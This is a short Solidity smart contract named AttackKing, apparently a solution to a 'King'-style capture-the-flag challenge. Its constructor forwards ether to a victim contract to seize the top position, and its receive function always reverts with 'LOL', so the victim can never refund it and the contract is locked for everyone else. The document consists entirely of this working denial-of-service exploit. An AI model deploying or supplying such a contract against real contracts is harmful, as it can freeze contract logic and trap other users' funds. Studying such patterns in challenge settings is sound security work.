pragma solidity ^0.8.0;

contract AttackKing {

    constructor(address _victim) payable {
        _victim.call{value: msg.value}("");
    }

    receive() external payable {
        revert("LOL");
    }
}